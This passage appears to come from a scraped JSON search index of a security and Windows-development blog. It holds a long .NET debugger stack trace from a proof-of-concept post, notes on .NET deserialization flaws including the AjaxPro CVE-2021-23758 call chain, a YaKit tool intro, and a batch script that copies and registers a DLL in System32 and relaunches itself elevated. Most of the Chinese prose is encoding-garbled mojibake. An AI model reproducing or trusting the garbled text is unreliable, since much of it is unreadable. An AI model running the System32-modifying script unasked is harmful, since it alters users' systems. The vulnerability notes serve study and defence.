clr!DispatchCallSimple12eee228 743b6cd4 clr!ThreadNative::InternalCrossContextCallback+0x64, calling clr!LazyMachStateCaptureState12eee274 72599072 (MethodDesc 7242cabc +0x11a System.RuntimeType.GetMethodImpl(System.String, System.Reflection.BindingFlags, System.Reflection.Binder, System.Reflection.CallingConventions, System.Type[], System.Reflection.ParameterModifier[]))12eee2d0 72633461 (MethodDesc 721cef08 +0xd1 System.Runtime.Remoting.Messaging.MethodCall.ResolveMethod(Boolean)), calling (MethodDesc 723290bc +0 System.Type.GetMethod(System.String, System.Reflection.BindingFlags, System.Reflection.Binder, System.Reflection.CallingConventions, System.Type[], System.Reflection.ParameterModifier[]))12eee2f8 72633de1 (MethodDesc 723f9df0 +0xa1 System.Runtime.Remoting.Channels.CrossContextChannel.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage)), calling clr!ThreadNative::InternalCrossContextCallback12eee338 7264afcb (MethodDesc 7230cf48 +0x93 System.Runtime.Remoting.Channels.ChannelServices.SyncDispatchMessage(System.Runtime.Remoting.Messaging.IMessage)), calling 016876f212eee364 7258fc41 (MethodDesc 7232d9c4 +0x11 System.Collections.Hashtable.set_Item(System.Object, System.Object)), calling (MethodDesc 7232da44 +0 System.Collections.Hashtable.Insert(System.Object, System.Object, Boolean))12eee374 72633044 (MethodDesc 721ceed0 +0xf4 System.Runtime.Remoting.Channels.CrossAppDomainSink.DoDispatch(Byte[], System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage, System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage ByRef)), calling (MethodDesc 7230cf48 +0 System.Runtime.Remoting.Channels.ChannelServices.SyncDispatchMessage(System.Runtime.Remoting.Messaging.IMessage))12eee38c 72637870 (MethodDesc 7230cc40 +0x84 System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatchCallback(System.Object[])), calling (MethodDesc 721ceed0 +0 System.Runtime.Remoting.Channels.CrossAppDomainSink.DoDispatch(Byte[], System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage, System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage ByRef))12eee3c4 72662505 (MethodDesc 72328110 +0xd System.Threading.Thread.CompleteCrossContextCallback(System.Threading.InternalCrossContextDelegate, System.Object[]))12eee3c8 74302546 clr!CallDescrWorkerInternal+0x3412eee3d4 7430e4c9 clr!CallDescrWorkerWithHandler+0x6b, calling clr!CallDescrWorkerInternal12eee3e8 7430e482 clr!CallDescrWorkerWithHandler+0x20, calling clr!_alloca_probe12eee410 7445dc15 clr!Thread::SafeSetLastThrownObject+0x58, calling clr!Thread::SetLastThrownObject12eee428 74322440 clr!DispatchCallDebuggerWrapper+0x59, calling clr!CallDescrWorkerWithHandler12eee448 7432e6e3 clr!SystemDomain::GetAppDomainAtId+0x68, calling clr!AppDomain::CanThreadEnter12eee46c 74322695 clr!DispatchCallSimple+0x8e, calling clr!DispatchCallDebuggerWrapper12eee4b8 743b6e26 clr!ThreadNative::InternalCrossContextCallback+0x1db, calling clr!DispatchCallSimple12eee520 743b6cd4 clr!ThreadNative::InternalCrossContextCallback+0x64, calling clr!LazyMachStateCaptureState12eee560 725c0486 (MethodDesc 72339858 +0x16 System.IO.BinaryWriter.Write(Byte))12eee564 725c0164 (MethodDesc 72339840 +0x10 System.IO.BinaryWriter.Flush())12eee574 725be4df (MethodDesc 723154f4 +0x217 System.Runtime.Serialization.Formatters.Binary.ObjectWriter.Serialize(System.Object, System.Runtime.Remoting.Messaging.Header[], System.Runtime.Serialization.Formatters.Binary.__BinaryWriter, Boolean)), calling (MethodDesc 7241f678 +0 System.Runtime.Serialization.SerializationObjectManager.RaiseOnSerializedEvent())12eee5ac 725be132 (MethodDesc 7233756c +0x96 System.Runtime.Serialization.Formatters.Binary.BinaryFormatter.Serialize(System.IO.Stream, System.Object, System.Runtime.Remoting.Messaging.Header[], Boolean)), calling clr!JIT_WriteBarrierEAX12eee5c8 72632d44 (MethodDesc 723f9c18 +0x88 System.Runtime.Remoting.Channels.CrossAppDomainSerializer.SerializeMessageParts(System.Collections.ArrayList))12eee5f0 72632ed6 (MethodDesc 723fa408 +0x7a System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatch(Byte[], System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage, System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage ByRef)), calling clr!ThreadNative::InternalCrossContextCallback12eee614 72632546 (MethodDesc 723fa414 +0x9a System.Runtime.Remoting.Channels.CrossAppDomainSink.SyncProcessMessage(System.Runtime.Remoting.Messaging.IMessage)), calling (MethodDesc 723fa408 +0 System.Runtime.Remoting.Channels.CrossAppDomainSink.DoTransitionDispatch(Byte[], System.Runtime.Remoting.Messaging.SmuggledMethodCallMessage, System.Runtime.Remoting.Messaging.SmuggledMethodReturnMessage ByRef))12eee660 7263233d (MethodDesc 723fa468 +0x51 System.Runtime.Remoting.Proxies.RemotingProxy.CallProcessMessage(System.Runtime.Remoting.Messaging.IMessageSink, System.Runtime.Remoting.Messaging.IMessage, System.Runtime.Remoting.Contexts.ArrayWithSize, System.Threading.Thread, System.Runtime.Remoting.Contexts.Context, Boolean)), calling 0168763e12eee674 7263224e (MethodDesc 723fa47c +0x1de System.Runtime.Remoting.Proxies.RemotingProxy.InternalInvoke(System.Runtime.Remoting.Messaging.IMethodCallMessage, Boolean, Int32)), calling (MethodDesc 723fa468 +0 System.Runtime.Remoting.Proxies.RemotingProxy.CallProcessMessage(System.Runtime.Remoting.Messaging.IMessageSink, System.Runtime.Remoting.Messaging.IMessage, System.Runtime.Remoting.Contexts.ArrayWithSize, System.Threading.Thread, System.Runtime.Remoting.Contexts.Context, Boolean))12eee6d0 72632069 (MethodDesc 723fa474 +0x69 System.Runtime.Remoting.Proxies.RemotingProxy.Invoke(System.Runtime.Remoting.Messaging.IMessage))12eee6ec 72631e94 (MethodDesc 72310284 +0xf4 System.Runtime.Remoting.Proxies.RealProxy.PrivateInvoke(System.Runtime.Remoting.Proxies.MessageData ByRef, Int32))12eee720 74302658 clr!CTPMethodTable__CallTargetHelper3+0xf12eee72c 743b2cf8 clr!CallTargetWorker2+0xaa, calling clr!CTPMethodTable__CallTargetHelper312eee74c 743b2cae clr!CallTargetWorker2+0x5b, calling clr!_alloca_probe12eee78c 745ff97d clr!TransparentProxyStubWorker+0x238, calling clr!CallTargetWorker212eee83c 76c88244 KERNEL32!QuirkIsEnabled3Worker+0x74, calling KERNEL32!__security_check_cookie12eee8b0 74302a46 clr!TransparentProxyStub_CrossContext+0x14, calling clr!TransparentProxyStubWorker12eee8e0 03dd3a2a (MethodDesc 01876968 +0x162 Mono.WebServer.FastCgi.Responder.Process()), calling 03dd033c12eee968 03dd3753 (MethodDesc 01879a68 +0x4b Mono.FastCgi.ResponderRequest.Worker(System.Object)), calling 01207a9e12eee9d8 726509a4 (MethodDesc 72309e6c +0x44 System.Threading.QueueUserWorkItemCallback.WaitCallback_Context(System.Object))12eee9e0 725a7e34 (MethodDesc 721ccddc +0xc4 System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean))12eeea44 725a7d67 (MethodDesc 72321734 +0x17 System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean)), calling (MethodDesc 721ccddc +0 System.Threading.ExecutionContext.RunInternal(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean))12eeea58 726509f5 (MethodDesc 72309e64 +0x45 System.Threading.QueueUserWorkItemCallback.System.Threading.IThreadPoolWorkItem.ExecuteWorkItem()), calling (MethodDesc 72321734 +0 System.Threading.ExecutionContext.Run(System.Threading.ExecutionContext, System.Threading.ContextCallback, System.Object, Boolean))12eeea74 72641abd (MethodDesc 7231286c +0x19d System.Threading.ThreadPoolWorkQueue.Dispatch()), calling 0168793612eeeac4 7264191b (MethodDesc 72312888 +0xb System.Threading._ThreadPoolWaitCallback.PerformWaitCallback()), calling (MethodDesc 7231286c +0 System.Threading.ThreadPoolWorkQueue.Dispatch())12eeeac8 74302546 clr!CallDescrWorkerInternal+0x3412eeead4 7430e4c9 clr!CallDescrWorkerWithHandler+0x6b, calling clr!CallDescrWorkerInternal12eeeae8 7430e482 clr!CallDescrWorkerWithHandler+0x20, calling clr!_alloca_probe12eeeb28 7430f197 clr!MethodDescCallSite::CallTargetWorker+0x170, calling clr!CallDescrWorkerWithHandler12eeeb34 7430ff64 clr!ArgIteratorTemplate&lt;ArgIteratorBase&gt;::ComputeReturnFlags+0x1b, calling clr!MetaSig::GetReturnTypeNormalized12eeeb50 7430f129 clr!MethodDescCallSite::CallTargetWorker+0x87, calling clr!_alloca_probe_1612eeeb80 74310fc0 clr!MethodDescCallSite::MethodDescCallSite+0x50, calling clr!ArgIteratorTemplate&lt;ArgIteratorBase&gt;::ForceSigWalk12eeeb9c 74462fd3 clr!QueueUserWorkItemManagedCallback+0x23, calling clr!MethodDescCallSite::CallTargetWorker12eeec1c 74313b24 clr!ManagedThreadBase_DispatchInner+0x7112eeec34 74313b9b clr!ManagedThreadBase_DispatchMiddle+0x8f, calling clr!ManagedThreadBase_DispatchInner12eeec5c 748427cc clr!DebuggerController::EnableTraceCall+0x6b, calling clr!_EH_epilog312eeec88 748369dd clr!Debugger::ThreadCreated+0x7c, calling clr!DebuggerController::EnableTraceCall12eeec8c 748369e2 clr!Debugger::ThreadCreated+0x81, calling clr!_EH_epilog312eeecbc 74313c4b clr!ManagedThreadBase_DispatchOuter+0x6d, calling clr!ManagedThreadBase_DispatchMiddle12eeed00 75c21c35 KERNELBASE!WaitForSingleObjectEx+0xa5, calling KERNELBASE!WaitForSingleObjectEx+0xd612eeed18 74313cc7 clr!ManagedThreadBase_FullTransitionWithAD+0x2f, calling clr!ManagedThreadBase_DispatchOuter12eeed3c 74462f5d clr!ManagedPerAppDomainTPCount::DispatchWorkItem+0xfe, calling clr!ManagedThreadBase_FullTransitionWithAD12eeed64 74462170 clr!CLRSemaphore::Wait+0xda, calling KERNELBASE!WaitForSingleObjectEx12eeed70 744621aa clr!CLRSemaphore::Wait+0x179, calling clr!_EH_epilog312eeeda8 743054f5 clr!EESleepEx+0x52, calling KERNELBASE!SleepEx12eeedc8 74462b71 clr!ThreadpoolMgr::UnfairSemaphore::Wait+0x167, calling clr!ThreadpoolMgr::UnfairSemaphore::UpdateCounts12eeedd0 74461c98 clr!PerAppDomainTPCountList::GetAppDomainIndexForThreadpoolDispatch+0x5412eeede8 74461d9c clr!ThreadpoolMgr::ExecuteWorkRequest+0x4e12eeee08 74461eb7 clr!ThreadpoolMgr::WorkerThreadStart+0x393, calling clr!ThreadpoolMgr::ExecuteWorkRequest12eeee74 7432eb34 clr!Thread::intermediateThreadProc+0x5812eeee84 77d1847e ntdll!RtlDosApplyFileIsolationRedirection_Ustr+0x32e, calling ntdll!memset12eeee9c 77d184f0 ntdll!RtlDosApplyFileIsolationRedirection_Ustr+0x3a0, calling ntdll!__security_check_cookie12eeef34 77d1baaf ntdll!RtlEqualUnicodeString+0x6f, calling ntdll!NLS_UPCASE12eeef50 77d1bd4f ntdll!LdrpFindLoadedDllByNameLockHeld+0xaf, calling ntdll!RtlEqualUnicodeString12eeef94 77d1bb95 ntdll!LdrpFindLoadedDllByName+0xb5, calling ntdll!RtlReleaseSRWLockExclusive12eeef98 77d1bc1e ntdll!LdrpFindLoadedDllByName+0x13e, calling ntdll!RtlGetCurrentServiceSessionId12eeef9c 77d19738 ntdll!LdrpRecordModuleDependency+0x17, calling ntdll!LdrpDependencyExist12eeefb4 77d17b5f ntdll!LdrpBuildForwarderLink+0x4a, calling ntdll!RtlReleaseSRWLockExclusive12eeefc4 77d5c822 ntdll!LdrpLogInternal+0x19, calling ntdll!RtlGetCurrentServiceSessionId12eeefd8 77d5b78d ntdll!LdrpLoadDllInternal+0x96, calling ntdll!LdrpLogInternal12eeefe4 77d16e7c ntdll!RtlDeactivateActivationContextUnsafeFast+0x9c, calling ntdll!__security_check_cookie12eef03c 77d170ae ntdll!LdrpLoadForwardedDll+0x11d, calling ntdll!LdrpLoadDllInternal12eef054 77d17120 ntdll!LdrpLoadForwardedDll+0x18f, calling ntdll!RtlDeactivateActivationContextUnsafeFast12eef058 77d170ba ntdll!LdrpLoadForwardedDll+0x129, calling ntdll!LdrpLoadForwardedDll+0x18412eef088 77d1704a ntdll!LdrpLoadForwardedDll+0xb9, calling ntdll!RtlActivateActivationContextUnsafeFast12eef08c 77d17120 ntdll!LdrpLoadForwardedDll+0x18f, calling ntdll!RtlDeactivateActivationContextUnsafeFast12eef26c 77d21e50 ntdll!RtlpImageDirectoryEntryToDataEx+0x40, calling ntdll!RtlImageNtHeaderEx12eef284 77d4674c ntdll!NtDeviceIoControlFile+0xc12eef288 75c1ebce KERNELBASE!ConsoleCallServerGeneric+0xe5, calling ntdll!NtDeviceIoControlFile12eef2bc 75c1ebdf KERNELBASE!ConsoleCallServerGeneric+0xf6, calling KERNELBASE!__security_check_cookie12eef2c0 77d22fd4 ntdll!RtlGuardCheckImageBase+0x12, calling ntdll!LdrControlFlowGuardEnforced12eef2f8 75c0e787 KERNELBASE!NlsValidateLocale+0x1c7, calling KERNELBASE!__security_check_cookie12eef340 75c1f2df KERNELBASE!RegKrnInitialize+0x34, calling KERNELBASE!__security_check_cookie12eef374 77d876ec ntdll!LdrpFindLoadedDllByAddress+0xa7, calling ntdll!RtlReleaseSRWLockExclusive12eef380 77d153f8 ntdll!LdrGetProcedureAddressForCaller+0x408, calling ntdll!LdrpResolveProcedureAddress12eef390 77d15499 ntdll!LdrGetProcedureAddressForCaller+0x4a9, calling ntdll!LdrpDereferenceModule12eef39c 77d15596 ntdll!LdrGetProcedureAddressForCaller+0x5a6, calling ntdll!__security_check_cookie12eef3a8 75c1eade KERNELBASE!ConsoleCallServer+0x26, calling KERNELBASE!ConsoleCallServerGeneric12eef3c0 75c9a101 KERNELBASE!SetThreadLocale+0x11, calling KERNELBASE!NlsValidateLocale12eef3d4 75c7f8e5 KERNELBASE!SetTEBLangID+0x60ebe, calling KERNELBASE!SetThreadLocale12eef400 75c1f291 KERNELBASE!_KernelBaseBaseDllInitialize+0x4ce, calling KERNELBASE!RegKrnInitialize12eef40c 75c1f2a1 KERNELBASE!_KernelBaseBaseDllInitialize+0x4de, calling KERNELBASE!__security_check_cookie12eef468 77d1c3e3 ntdll!RtlpAllocateHeapInternal+0x443, calling ntdll!RtlpLfhFindClearBitAndSet12eef524 5af04614 DnrspSDK32!__crt_unique_heap_ptr&lt;__acrt_ptd,__crt_internal_free_policy&gt;::operator bool+0x134, calling DnrspSDK32!__acrt_unlock12eef544 5ae65898 DnrspSDK32!DllMain+0x28, calling DnrspSDK32!__CheckForDebuggerJustMyCode12eef614 64734693 appresolver!__scrt_dllmain_crt_thread_attach+0x11, calling appresolver!Microsoft::WRL::Wrappers::HandleT&lt;Microsoft::WRL::Wrappers::HandleTraits::ClientDCTraits&gt;::InternalClose12eef618 64733fed appresolver!dllmain_crt_dispatch+0x2d, calling appresolver!__scrt_dllmain_crt_thread_attach12eef620 6473424e appresolver!dllmain_dispatch+0x70, calling appresolver!DllMain12eef660 6473433e appresolver!_DllMainCRTStartup+0x1e, calling appresolver!dllmain_dispatch12eef674 77d16e7c ntdll!RtlDeactivateActivationContextUnsafeFast+0x9c, calling ntdll!__security_check_cookie12eef694 77d16f1e ntdll!LdrpCallInitRoutine+0x51, calling ntdll!LdrxCallInitRoutine12eef6a0 77d16f4e ntdll!LdrpCallInitRoutine+0x81, calling ntdll!RtlGetCurrentServiceSessionId12eef6a4 77d16f34 ntdll!LdrpCallInitRoutine+0x67, calling ntdll!LdrpCallInitRoutine+0x7c12eef6d0 77d467bc ntdll!NtSetEvent+0xc12eef6d4 77d3bc8c ntdll!LdrpDropLastInProgressCount+0x38, calling ntdll!NtSetEvent12eef6e4 77d16d22 ntdll!LdrpInitializeThread+0x22a, calling ntdll!LdrpDropLastInProgressCount12eef6e8 77d16cf6 ntdll!LdrpInitializeThread+0x1fe, calling ntdll!LdrpInitializeThread+0x21b12eef73c 77d16c53 ntdll!LdrpInitializeThread+0x15b, calling ntdll!RtlActivateActivationContextUnsafeFast12eef740 77d16c94 ntdll!LdrpInitializeThread+0x19c, calling ntdll!RtlDeactivateActivationContextUnsafeFast12eef77c 77d483fc ntdll!NtTestAlert+0xc12eef780 77d2df7b ntdll!_LdrpInitialize+0x29f, calling ntdll!NtTestAlert12eef7d0 77d5cb43 ntdll!LdrpInitializeInternal+0xc7, calling ntdll!_LdrpInitialize12eef7dc 77d5cb5a ntdll!LdrpInitializeInternal+0xde, calling ntdll!__security_check_cookie12eefa08 77d2dcd0 ntdll!LdrpInitialize+0x3b, calling ntdll!LdrpInitializeInternal12eefa10 77d46b2c ntdll!NtContinue+0xc12eefa14 77d2dc89 ntdll!LdrInitializeThunk+0x29, calling ntdll!NtContinue12eefc78 7432eb17 clr!Thread::intermediateThreadProc+0x3b, calling clr!_alloca_probe_1612eefc8c 76c87ba9 KERNEL32!BaseThreadInitThunk+0x1912eefc9c 77d3bd2b ntdll!__RtlUserThreadStart+0x2b12eefcf4 77d3bcaf ntdll!_RtlUserThreadStart+0x1b, calling ntdll!__RtlUserThreadStart","tags":[{"name":"POC","slug":"POC","permalink":"https://hodlyounger.github.io/tags/POC/"},{"name":"æ¼æ´","slug":"æ¼æ´","permalink":"https://hodlyounger.github.io/tags/%E6%BC%8F%E6%B4%9E/"}],"categories":[{"name":"A_å†…åŠŸ","slug":"A-å†…åŠŸ","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/"},{"name":"A_POCæ¢ç´¢","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/"},{"name":"ç•…æ·é€š","slug":"A-å†…åŠŸ/A-POCæ¢ç´¢/ç•…æ·é€š","permalink":"https://hodlyounger.github.io/categories/A-%E5%86%85%E5%8A%9F/A-POC%E6%8E%A2%E7%B4%A2/%E7%95%85%E6%8D%B7%E9%80%9A/"}]},{"title":"ã€.Netã€‘ååºåˆ—åŒ–æ¼æ´æ¢ç´¢","date":"2024-04-15T10:27:03.494Z","path":"B_Code/CSharp/ã€.Netã€‘ååºåˆ—åŒ–æ¢ç´¢/","text":"æ¦‚è¿°ï¼š.Net ååºåˆ—åŠæ¼æ´ç›¸å…³è‡ªæ´½è®°å½•ã€‚ å…è´£å£°æ˜ï¼šæœ¬æ–‡æ‰€æ¶‰åŠçš„ä¿¡æ¯å®‰å…¨æŠ€æœ¯çŸ¥è¯†ä»…ä¾›å‚è€ƒå’Œå­¦ä¹ ä¹‹ç”¨ï¼Œå¹¶ä¸æ„æˆä»»ä½•æ˜ç¤ºæˆ–æš—ç¤ºçš„ä¿è¯ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡æä¾›çš„ä¿¡æ¯æ—¶ï¼Œåº”è‡ªè¡Œåˆ¤æ–­å…¶é€‚ç”¨æ€§ï¼Œå¹¶æ‰¿æ‹…ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡é£é™©å’Œè´£ä»»ã€‚æœ¬æ–‡ä½œè€…å¯¹äºè¯»è€…åŸºäºæœ¬æ–‡å†…å®¹æ‰€åšå‡ºçš„ä»»ä½•è¡Œä¸ºæˆ–å†³å®šä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ã€‚åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œæœ¬æ–‡ä½œè€…ä¸å¯¹å› ä½¿ç”¨æœ¬æ–‡å†…å®¹è€Œå¯¼è‡´çš„ä»»ä½•ç›´æ¥ã€é—´æ¥ã€ç‰¹æ®Šæˆ–åæœæ€§æŸå¤±æ‰¿æ‹…è´£ä»»ã€‚è¯»è€…åœ¨ä½¿ç”¨æœ¬æ–‡å†…å®¹æ—¶åº”å½“éµå®ˆå½“åœ°æ³•å¾‹æ³•è§„ï¼Œå¹¶ä¿è¯ä¸è¿åä»»ä½•ç›¸å…³æ³•å¾‹æ³•è§„ã€‚ å¼€æºé¡¹ç›®å’Œæ–‡ç« æ¨è é¡¹ç›®ï¼š Ivan1ee/NET-Deserialize: æ€»ç»“äº† 20+.Net ååºåˆ—åŒ–æ–‡ç« ï¼ŒæŒç»­æ›´æ–° æ–‡ç« ï¼š ã€æœ€æ–°æ¼æ´é¢„è­¦ã€‘å¼€æºç»„ä»¶æ¼æ´ä¹‹ CVE-2021-23758 AjaxPro.NET ååºåˆ—åŒ–æ¼æ´ | CN-SEC ä¸­æ–‡ç½‘ AjaxPro.NET ååºåˆ—åŒ–æ¼æ´(CVE-2021-23758)-æ–°åä¸‰é›†å›¢-H3C ååºåˆ—åŒ–è¯´æ˜ åœ¨ .NET ä¸­ï¼Œååºåˆ—åŒ–æ¼æ´é€šå¸¸æ˜¯ç”±äºä¸å®‰å…¨åœ°å¤„ç†åºåˆ—åŒ–çš„æ•°æ®è€Œäº§ç”Ÿçš„ã€‚å½“åº”ç”¨ç¨‹åºååºåˆ—åŒ–æ¥è‡ªä¸å—ä¿¡ä»»æ¥æºçš„æ•°æ®æ—¶ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šæ„é€ æ¶æ„çš„åºåˆ—åŒ–æ•°æ®ï¼Œä»è€Œåœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œæˆ–å…¶ä»–æ¶æ„è¡Œä¸ºã€‚ .NET æ¡†æ¶æä¾›äº†å¤šç§åºåˆ—åŒ–æœºåˆ¶ï¼Œå¦‚äºŒè¿›åˆ¶æ ¼å¼åŒ–ç¨‹åºï¼ˆBinaryFormatterï¼‰ã€SOAP æ ¼å¼åŒ–ç¨‹åºï¼ˆSoapFormatterï¼‰ã€æ•°æ®å¥‘çº¦åºåˆ—åŒ–ç¨‹åºï¼ˆDataContractSerializerï¼‰ç­‰ã€‚è¿™äº›åºåˆ—åŒ–æœºåˆ¶åœ¨é»˜è®¤æƒ…å†µä¸‹å¯èƒ½ä¸å®‰å…¨ï¼Œå› ä¸ºå®ƒä»¬å¯èƒ½å…è®¸æ”»å‡»è€…åˆ©ç”¨æŸäº›ç±»å‹çš„å®‰å…¨æ¼æ´ã€‚ .Net ååºåˆ—åŒ–å¸¸è§ç›¸å…³å‡½æ•° ç›®å‰å·²ç»æœ‰å‘ç°çš„ç›¸å…³ååºåˆ—æ¼æ´æ¶‰åŠçš„å‡½æ•°åŒ…æ‹¬ä½†ä¸é™äºä»¥ä¸‹æ‰€ç¤ºç›¸å…³å‡½æ•°ï¼š XmlSerializer NetDataContractSerializer FastJson BinaryFormatter Json.Net .Net Remoting SoapFormatter DataContractSerializer LosFormatter ObjectStateFormatter ã€.Netã€‘å¯æ‰§è¡Œæ–‡ä»¶ç»“æ„åˆ†æ.md JavaScriptSerializer å †æ ˆå®ä¾‹ å¯æŸ¥çœ‹æ–‡ç«  ã€CVE-2021-23758ã€‘Ajax .NET Professional ä¸­çš„ RCE æ¼æ´ ä¸­çš„åˆ†æã€‚å…³é”®è°ƒç”¨å¦‚ä¸‹æ‰€ç¤ºï¼š 12345AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.DeserializeCustomObject(AjaxPro.JavaScriptObject o, System.Type type) AjaxPro.2.dll!AjaxPro.JavaScriptDeserializer.Deserialize(AjaxPro.IJavaScriptObject o, System.Type type) AjaxPro.2.dll!AjaxPro.XmlHttpRequestProcessor.RetreiveParameters() AjaxPro.2.dll!AjaxPro.AjaxProcHelper.Run() AjaxPro.2.dll!AjaxPro.AjaxSyncHttpHandler.ProcessRequest(System.Web.HttpContext context)","tags":[{"name":".Net","slug":"Net","permalink":"https://hodlyounger.github.io/tags/Net/"}],"categories":[{"name":"B_Code","slug":"B-Code","permalink":"https://hodlyounger.github.io/categories/B-Code/"},{"name":"CSharp","slug":"B-Code/CSharp","permalink":"https://hodlyounger.github.io/categories/B-Code/CSharp/"}]},{"title":"ã€å·¥å…·ã€‘YaKit å•å…µæ¸—é€æµ‹è¯•å·¥å…·","date":"2024-04-11T16:00:00.000Z","path":"G_å·¥å…·/ã€å·¥å…·ã€‘YaKit å•å…µæ¸—é€æµ‹è¯•å·¥å…·/","text":"æ¦‚è¿°ï¼šå•å…µä½œæˆ˜æ¸—é€å·¥å…·ä»‹ç»â€”â€”Yakit ä¸‹è½½é“¾æ¥ ä¸‹è½½å®‰è£…ä¸æ›´æ–°é…ç½® | Yak Program Language ä½¿ç”¨æ¢ç´¢ poc å¦‚ä½•ä½¿ç”¨ æ¸—é€æµ‹è¯•åŒå±… -&gt; Web Fuzzer -&gt; æŠŠç›¸åº”çš„ POC ä»£ç ç²˜è´´åˆ° Request ä¸­ï¼Œç„¶ååº—å®¶å‘é€è¯·æ±‚å³å¯ã€‚","tags":[{"name":"å·¥å…·","slug":"å·¥å…·","permalink":"https://hodlyounger.github.io/tags/%E5%B7%A5%E5%85%B7/"},{"name":"POC","slug":"POC","permalink":"https://hodlyounger.github.io/tags/POC/"}],"categories":[{"name":"G_å·¥å…·","slug":"G-å·¥å…·","permalink":"https://hodlyounger.github.io/categories/G-%E5%B7%A5%E5%85%B7/"}]},{"title":"ã€æ‰¹å¤„ç†ã€‘è·å– UAC æƒé™","date":"2024-04-09T09:37:41.349Z","path":"A_OS/Windows/æ‰¹å¤„ç†/ã€æ‰¹å¤„ç†ã€‘è·å–uacæƒé™/","text":"æ¦‚è¿°ï¼šæ‰¹å¤„ç†è·å–UACæƒé™è„šæœ¬ 123456789101112131415161718192021222324252627@echo offif exist &quot;%SystemRoot%\\system32\\atl100.dll&quot; ( ::xcopy atl100.dll D:\\ /-y ::echo &quot;1&quot;) else ( xcopy atl100.dll C:\\Windows\\System32 /-y regsvr32 atl100.dll /n /i )setlocalset uac=~uac_permission_tmp_%random%md &quot;%SystemRoot%\\system32\\%uac%&quot; 2&gt;nulif %errorlevel%==0 ( rd &quot;%SystemRoot%\\system32\\%uac%&quot; &gt;nul 2&gt;nul ) else ( echo set uac = CreateObject^(&quot;Shell.Application&quot;^)&gt;&quot;%temp%\\%uac%.vbs&quot; echo uac.ShellExecute &quot;%~s0&quot;,&quot;&quot;,&quot;&quot;,&quot;runas&quot;,1 &gt;&gt;&quot;%temp%\\%uac%.vbs&quot; echo WScript.Quit &gt;&gt;&quot;%temp%\\%uac%.vbs&quot; &quot;%temp%\\%uac%.vbs&quot; /f del /f /q &quot;%temp%\\%uac%.vbs&quot; &amp; exit )endlocal:Run:: ä¸‹é¢ä»£ç æ›¿æ¢ä¸ºè‡ªå·±çš„regsvr32 &quot;%~dp0%LockKeys.dll&quot;exit","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"windows/cmd","slug":"windows-cmd","permalink":"https://hodlyounger.github.io/tags/windows-cmd/"},{"name":"windows/uac","slug":"windows-uac","permalink":"https://hodlyounger.github.io/tags/windows-uac/"},{"name":"uac","slug":"uac","permalink":"https://hodlyounger.github.io/tags/uac/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æ‰¹å¤„ç†","slug":"A-OS/Windows/æ‰¹å¤„ç†","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%89%B9%E5%A4%84%E7%90%86/"}]},{"title":"ã€WINã€‘DeskBand æ‰«ç›²","date":"2024-04-09T09:31:12.470Z","path":"A_OS/Windows/Shellæ‰©å±•/ã€Winã€‘DeskBand æ‰«ç›²/","text":"æ¦‚è¿°ï¼šWindows DeskBand å¼€å‘çš„çŸ¥è¯†ç‚¹åŠé¡¹ç›®ä»‹ç» [toc] DeskBand DeskBand æŒ‡ Windows æ“ä½œç³»ç»Ÿä¸Šå·¥å…·æ æŒ‰é’®ï¼Œå¯ä»¥é€šè¿‡åœ¨å·¥å…·æ æ·»åŠ æŒ‰é’®æ¥æ·»åŠ ä¸€äº›åŠŸèƒ½ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º360å¼€å‘çš„DeskBandâ€”â€”360Uç›˜åŠ©æ‰‹ã€‚ å¼€å‘è¯´æ˜ å‚è€ƒæ–‡ç« ï¼š DeskBandå®ç°ä¹‹â€”â€”å¯¹è±¡ä»‹ç»-CSDNåšå®¢ å¦‚ä½•åˆ›å»º å¼€æºé¡¹ç›®ï¼š Windows-classic-samples/Samples/Win7Samples/winui/shell/shellextensibility/deskbands at a47da3d4551b74bb8cc1f4c7447445ac594afb44 Â· microsoft/Windows-classic-samples AzureGreen/NetView: a deskband plus-in which can view real-time net speed slivermeteor/LockKeys: The windows explorer extension to show the status of Capslock and Numlock in the 